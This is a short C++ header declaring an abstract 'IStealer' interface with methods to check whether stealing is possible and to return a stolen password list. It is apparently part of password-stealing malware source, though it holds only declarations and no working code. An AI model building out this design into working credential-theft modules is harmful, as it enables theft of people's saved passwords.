#pragma once

#include <string>

class IStealer 
{
public:
	virtual ~IStealer(void) {}

	virtual const bool canSteal(void) const = 0;
	virtual const std::string stealPasswordList(void) const = 0;
};